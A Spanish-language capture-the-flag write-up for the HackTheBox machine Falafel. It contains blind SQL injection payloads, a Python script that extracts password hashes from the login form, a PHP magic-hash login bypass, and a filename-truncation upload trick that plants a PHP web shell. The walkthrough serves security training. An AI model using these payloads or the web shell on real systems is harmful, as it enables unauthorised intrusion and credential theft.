## Vulnerability Assessment {-}

### Blind SQL Injection {-}

Como no podemos utilizar el `upload.php` solo nos queda que intentar cosas con el panel de login.
Como sabemos que el usuario **admin** existe, probamos cosas como:

- admin:test -> Wrong identification: admin
- admin':test -> Try Again
- admin' and sleep(5)-- -:tes -> Hacking attempt detected
- ():test -> Try Again
- sleep:test -> Hacking attempt detected
- admin' order by 100-- -:test -> Try Again
- admin' order by 3-- -:test -> Wrong identification: admin
- admin' order by 4-- -:test -> Wrong identification: admin
- admin' order by 5-- -:test -> Try Again
- admin' union select 1,2,3,4-- -:test -> Hacking attempt detected
- select:test -> Try Again
- union:test -> Hacking attempt detected
- dsafdasdfuniondasfasdf:test -> Hacking attempt detected

Estas pruebas nos dan, como informacion, que el panel de login parece ser vulnerable a SQLI, que palabras como union o sleep estan black listeadas y 
que la respuesta de la llamada SQL tiene 4 columnas. Vamos a validar la respuesta de la web en caso de un error y en caso de una buena formula.

- admin' and substring(username,1,1)='a'-- -:test -> Wrong identification: admin
- admin' and substring(username,1,1)='b'-- -:test -> Try Again
- admin' and substring(username,2,1)='d'-- -:test -> Wrong identification: admin
- admin' and substring(username,2,1)='w'-- -:test -> Try Again

Aqui ya vemos que typo de ataque podriamos hacer y tito s4vitar nos quiere enseñarnos como hacer un ataque de typo Cluster Bomb con BurpSuite aunque tiraremos de
un script en python que es mucho mas agil.

#### Cluster Bomb attack con BurpSuite {-}

1. Interceptamos y modificamos la SQLI desde BurpSuite

    ```{r, echo = FALSE, fig.cap="Burp sqli interception", out.width="90%"}
        knitr::include_graphics("images/Falafel-SQLI-intercept.png")
    ```

1. Con Ctrl+i lo enviamos al intruder
1. En el nodo Positions damos al boton `clear §` y selectionamos:
    
    - el primer 1 y le damos al boton `add §`
    - la letra a y le damos al boton `add §`
    - cambiamos el attack type para que valga `Cluster Bomb`

    ```{r, echo = FALSE, fig.cap="Burp Cluster Bomb config", out.width="90%"}
        knitr::include_graphics("images/Falafel-ClusterBomb-config-payload.png")
    ```

1. En el nodo Payloads, seleccionamos el Payload set numero 1
   
    - cambiamos el payload type a Numbers
    - cambiamos el Number range en sequential From 1 To 5 con step de 1
    - sacamos el URL encode del final de la pagina

    ```{r, echo = FALSE, fig.cap="Burp Cluster Bomb config set 1", out.width="90%"}
    knitr::include_graphics("images/Falafel-ClusterBomb-config-payload1.png")
    ```

1. En el nodo Payloads, seleccionamos el Payload set numero 2
   
    - cambiamos el payload type a Brute forcer
    - cambiamos el Character set a `abcdefghijklmnopqrstuvwxyz` con un Min length de 1 y un Max length de 1
    - sacamos el URL encode del final de la pagina

    ```{r, echo = FALSE, fig.cap="Burp Cluster Bomb config set 2", out.width="90%"}
    knitr::include_graphics("images/Falafel-ClusterBomb-config-payload2.png")
    ```

1. En el nodo Options En el Grep - Match

    - damos al boton Clear
    - añadimos `Wrong identification`
    
    ```{r, echo = FALSE, fig.cap="Burp Cluster Bomb config matcher", out.width="90%"}
    knitr::include_graphics("images/Falafel-ClusterBomb-config-matcher.png")
    ```
    
1. Le damos al boton start attack

Aqui vemos que el resultado es un poco complicado pero se podria hacer de esta forma.

#### Cluster Bomb attack version Python {-}

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import pdb
import signal
import time
import sys

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://10.10.10.73/login.php"
s = r'abcdef0123456789'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p2 = log.progress("Password")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    password = ""

    for position in range(1, 40):
        for character in s:
            p1.status("Probando caracter %c en la posiciÃ³n %d" % (character, position))
            post_data = {
                'username': "chris' and substring(password,%d,1)='%c'-- -" % (position, character),
                'password': 'admin'
            }

            r = requests.post(login_url, data=post_data)

            if "Wrong identification" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeRequest()
```

Cambiando el nombre de usuario, podemos buscar la contraseña del usuario chris y admin. una vez lanzado el script, podemos recoger 
la contraseña md5 de cada uno de estos usuarios.

### Crackeamos las contraseñas con crackstation {-}

Abrimos la web de [crackstation](https://crackstation.net/) y colamos los hashes. Encontramos la contraseña del usuario `chris`.

### Loggearse como el usuario admin {-}

Aqui es donde viene toda la parte mas interesante de la maquina. Si nos connectamos como el usuario **chris** vemos que habla de juggling pero poco mas.
Si intentamos connectar a la url `http://10.10.10.73/upload.php` todavia hay una redireccion. Como habla de juggling, pensamos en seguida en una vulnerabilidad
de typo **type juggling** pero tampoco es esto. Esta via se parece mas a un rabbit hole que otra cosa.

Si analyzamos las contraseñas, mejor dicho los hashes encontrados:

- admin:0e462096931906507119562988736854
- chris:d4ee02a22fc872e36d9e3751ba72ddc8

Nos damos cuenta que el hash del usuario chris contiene letras y numeros pero la del usuario admin solo contiene numeros. Porque digo que solo contiene numeros?
Porque si pensamos en forma mathematica, la letra `e` corresponde a un **por 10 elevado a** (en este caso 0 por 10 elevado a 462096931906507119562988736854) al final
solo son numeros.

La vulnerabilidad aqui viene si dos condiciones existen:

1. En `php` la comparativa esta exprimida con un `==` y no con un `===`
1. Si el hash md5 de una contraseña empieza por 0e*xxxxxxxxxxxx...*

Porque succede esta vulnerabilidad? Porque si los hashes de las 2 contraseñas empiezan por 0e*xxx...* y que la comparativa es unicamente de doble igual, como no 
va a comparar de manera stricta, 0 por 10 elevado a cualquier cos (que vale 0) comparado a 0 por 10 elevado a cualquier otra cosa (que tambien vale 0) **SON IGUALES**.

Si miramos por google por `0e hash collision` por ejemplo el articulo de [ycombinator](https://news.ycombinator.com/item?id=9484757), vemos quel hash md5 de `240610708`
da un hash `0e462097431906509019562988736854` o el hash md5 de `QNKCDZO` nos da `0e830400451993494058024219903391`.

En php, si la comparativa es con un doble igual, estos dos hashes son iguales. Si vamos a la pagina de login y entramos el usuario *admin* y la contraseña *QNKCDZO*,
conseguimos loggearnos como el usuario admin.

### Burlar el upload de imagenes {-}

Una vez loggeados entramos en el panel de upload. Aqui la web nos pone de uploadear una imagen desde una url. Recuperamos una imagen de pollo en la web y la copiamos
en nuestro directorio de trabajo. Lanzamos un servidor web con python `python3 -m http.server 80` y uploadeamos el fichero desde la web poniendo la url `http://10.10.14.15/madafackingchicken.png`.

Aqui nos sale un Output con el commando lanzado por la maquina victima :

```bash
CMD: cd /var/www/html/uploads/0026-2354_e426c9e8c2f64caa; wget 'http://10.10.14.15/madafackingchicken.png'
```

Si miramos en la url `http://10.10.10.73/uploads/0026-2354_e426c9e8c2f64caa/madafackingchicken.png` vemos la imagen del pollo que hemos enviado a la web.

#### wget vulnerabilidad {-}

Tito S4vitar nos avanza aqui que el programa solo permite enviar ficheros con extension `png` o sea ya sabemos que no podemos enviar ficheros `.php`. Pero como
conocemos el commando echo por la maquina victima, y vemos que se utiliza el commando wget, ya tenemos una via potencial de ataque, el nombre de caracteres del nombre del fichero.
En linux, un fichero solo puede tener un nombre de fichero inferior a 255 caracteres incluida la extension. En el caso de un ficher `.png`, el limite maximo de un fichero
seria un nombre de 251 caracteres seguidos de la extension `.png`.

Copiando el resultado del comando `python -c "A"*251 + ".png"` y cambiando el nombre del fichero `madafackingchicken.png` con ello, si uploadeamos este fichero en la web,
vemos que en el resultado de **Saving To** que solo guarda un 235 "A" como nombre de fichero. Esto quiere decir que si enviamos un ficher que tiene como nombre `231 A` con una extesion `.php.png`
la web va a ver que el fichero es un ficher `.png` pero al momento de guardarlo, va a guardar los 235 primeros caracteres que equivalen a `231 A` y la extension `.php`

Creamos un fichero php

```php
touch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png
vi AAAAAA*

<?php
    echo "<pre>" .shell_exec($_REQUEST['cmd']) ."</pre>";
?>
```

Si enviamos este fichero, vemos que el fichero se a enviado como fichero **.png** pero salvado como fichero **.php** si vamos a la url `http://10.10.10.73/uploads/0026-2354_e426c9e8c2f64caa/AAAAAAAAAA.......AAAA.php?cmd=whoami`
vemos que somos `www-data`.
